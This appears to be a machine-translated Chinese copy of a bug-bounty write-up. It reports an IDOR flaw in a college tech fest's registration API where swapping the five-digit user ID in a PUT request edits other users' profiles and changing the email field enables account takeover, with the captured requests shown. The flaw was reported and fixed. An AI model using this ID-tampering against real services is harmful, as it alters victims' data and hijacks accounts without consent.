# 黑了南印度 Tathva 的 22 个最大的技术管理节

> 原文：<https://infosecwriteups.com/hacked-tathva-22-biggest-techno-management-fest-in-south-india-6a95435c82e7?source=collection_archive---------2----------------------->

- 7h3h4ckv157

![](img/db0ddcf43c7cf396b5bfa303034bf93e.png)

你好，信息安全伙伴ッ✋✋，

在这篇文章中，我分享了一个关于我如何黑掉南印度最大的技术管理盛会 Tathva 的小故事。

**(尼特卡利卡特技术管理节)**

*   它在每个工科学生的日程表中找到了自己的位置。南印度最大的技术创新和管理能力平台之一

## 关于窃听器

*   在我进入主题之前，让我告诉你关于 **IDOR** 的事情。围绕这个话题，现在有大量的博客和指导性练习。不过，我会提供一个简洁的说明。

## 不安全直接对象引用(IDOR)

*   这是一种访问控制(或授权)漏洞。
*   **访问控制:**指定是否允许用户执行他们想要完成的动作。
*   **IDOR** :当应用程序使用用户提供的输入来直接访问对象时。如果用户控制的参数值被用来直接访问资源或功能，它就可能被利用。

更多信息:

> [https://portswigger.net/web-security/access-control](https://portswigger.net/web-security/access-control)
> 
> [https://portswigger.net/web-security/access-control/idor](https://portswigger.net/web-security/access-control/idor)

## 1922 年在塔瓦的伊多

我的朋友[**Ranjul Aru madi**](https://github.com/Ranjul-Arumadi)指出了这个事件，并鼓励我参加网上夺旗比赛。注册后，我确保能够在以下网址编辑我的详细信息:

> [https://www.tathva.org/register?editprofile=true](https://www.tathva.org/register?editprofile=true)

我对安全很好奇。我在编辑个人资料时截获了这个请求，看到了一些有趣的东西。

```
**First request**OPTIONS /api/users/15862 HTTP/1.1
Host: api.tathva.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
Referer: [https://www.tathva.org/](https://www.tathva.org/)
Origin: [https://www.tathva.org](https://www.tathva.org)
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Sec-Gpc: 1
Te: trailers
Connection: close**Second request**PUT /api/users/15871 HTTP/1.1
Host: api.tathva.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: 
Content-Length: 300
Origin: [https://www.tathva.org](https://www.tathva.org)
Referer: [https://www.tathva.org/](https://www.tathva.org/)
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Sec-Gpc: 1
Te: trailers
Connection: close{"id":15871,
"name":" ",
"gender":"male",
"college":" ",
"branch":" ",
"year":" ",
"state":" ",
"district":" ",
"phone":" "}
```

## 漏洞确认

你可以看到***"/API/users/<ID>"***顶部的请求。

这个 5 位数的<id>值可以手动更改，攻击者可以在其他用户不知情的情况下，对他们的详细信息进行返工。</id>

例如:

> 假设，攻击者的身份证号= 15860。
> 他/她/他们可以更改该值，并设置为任意五位数的随机值。所以，相应用户的详细信息会在他们不知情的情况下发生变化。

## 影响

*   **完整性** : **高**

> **完整性:**确保系统及其数据不会遭受未经授权的修改的能力。完整性保护不仅保护数据，还保护操作系统、应用程序和硬件不被未经授权的个人篡改。

## 概念验证:视频

## 账户接管

遇到这个漏洞后，我检查了请求的响应，发现了额外的东西。

```
**The Response**{"id":<ID>,
"username":<USER-NAME>",
"email":"<MAIL>",
"provider":"google",
"resetPasswordToken":null,
"confirmationToken":null,
"confirmed":true,
"blocked":false,
"name":"<NAME>",
"refCode":null,
"state":"<STATE>",
"district":"<DIS>",
"gender":"male",
"tathvaId":"T22-JSAVL",
"hostel":null,
"createdAt":"<DATE>",
"updatedAt":"<DATE>",
"phone":"<NUMBER>",
"college":"<COLLEGE>",
"year":"Year 4",
"branch":"any",
"registeredWorkshops":[],
"registeredEvents":[],
"registeredLectures":[],
"registeredCompetitions":[],
"bookedAccomodation":null,
"event_admin":null,
"event_volunteer":null,
"competition_admin":null,
"competition_volunteer":null,
"workshop_admin":null,
"workshop_volunteer":null,
"lecture_admin":null,
"lecture_volunteer":null}By simply editing**"email":"<MAIL>"** from the response itself, we can takeover the victim's account.Eg: change [victim@gmail.com](mailto:victim@gmail.com) to [attacker@gmail.com](mailto:attacker@gmail.com)The attacker can take control of the account through owned mails.
```

在该域上注册的所有用户帐户都变得易受攻击。

在为时已晚之前，我通过邮件和我的关系联系了他们。

*   报道时间:2022 年 10 月 20 日凌晨 1 点 05 分
*   修复确认:2022 年 10 月 22 日，晚上 11:44
*   赏金奖励:0 美元

快乐安全！

请随时与我联系并分享您的观点。你可以在这里找到我@[7h 3h 4 ckv 157](https://twitter.com/7h3h4ckv157)

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周时事通讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！